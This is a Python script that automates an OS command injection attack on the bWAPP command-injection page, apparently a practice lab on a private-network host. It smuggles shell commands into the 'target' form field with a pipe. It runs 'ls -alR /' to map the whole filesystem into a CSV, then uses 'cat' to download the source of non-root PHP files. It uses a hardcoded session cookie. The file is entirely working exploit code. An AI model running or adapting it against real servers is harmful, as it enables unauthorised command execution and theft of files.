from bs4 import BeautifulSoup
import requests
import re
import csv
import threading
import os

path_pattern = re.compile(r'^/[\w-]+(/[\w-]+)*:$')
php_pattern = re.compile(r'[^.]+.php$')
save_path = './php'
cookie =''

def extract_php_file(path):
    response = define_request(f"cat {path}")
    php_file_content = parse_data(response)
    
    with open(f"{save_path}/{path.split('/')[-1]}", "w", encoding='utf-8') as file:
        for content in php_file_content:
            file.write(content.text)


def define_type(char):
    if char == 'd':
        return 'Dir'
    elif char == '-':
        return 'File'
    elif char == 'l':
        return 'Link'
    elif char == 'c':
        return 'character device file'
    elif char == 'b':
        return 'block device file'
    elif char == 'p':
        return 'pipe file'
    elif char == 's':
        return 'socket file'

def define_request(command):
    url = "http://192.168.45.236/bWAPP/commandi.php"

    headers = {
        "Host": "192.168.45.236",
        "Content-Length": "42",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://192.168.45.236",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://192.168.45.236/bWAPP/commandi.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": f"PHPSESSID={cookie}; security_level=0",
        "Connection": "close",
    }

    data = {
        "target": f"www.nsa.gov | {command}",
        "form": "submit",
    }

    response = requests.post(url, headers=headers, data=data)
    return response

def parse_data(response):
    pre_data = BeautifulSoup(response.text, 'html.parser')
    p_tags = pre_data.find_all('p')
    return p_tags

def make_csv(p_tags):
    path = "/"
    threads = []
    with open("output.csv", "w", newline='', encoding='utf-8') as file:
        writer = csv.writer(file, quoting=csv.QUOTE_ALL)
        writer.writerow(["Type", "Permissions", "Links", "Owner", "Group", "Size", "Last Modified", "Name", "Parent Directory"])
        for tag in p_tags:
            lines = tag.text.split('\n')
            for line in lines:
                parts = line.split()
                match = path_pattern.search(line)
                if match:
                    path = parts[0][:-1]
                    continue
                if len(parts) < 9:
                    continue
                else:
                    if php_pattern.match(parts[-1]) and parts[3] != 'root'and parts[3] != 'root':
                        tmp = threading.Thread(target=extract_php_file, args=(parts[-1],))
                        threads.append(tmp)
                        tmp.start()
                    file_type = define_type(parts[0][0])
                    writer.writerow([file_type, parts[0], parts[1], parts[2], parts[3], parts[4], " ".join(parts[5:8]), " ".join(parts[8:]), path])
    return threads
      
if __name__ == "__main__":
    if not os.path.exists(save_path):
        os.makedirs(save_path)
    cookie = '2c1df5bbc1372ec3869630eabaad9fbe'
    response = define_request("ls -alR /")
    p_tags = parse_data(response)
    threads = make_csv(p_tags)
        
    for thread in threads:
        thread.join()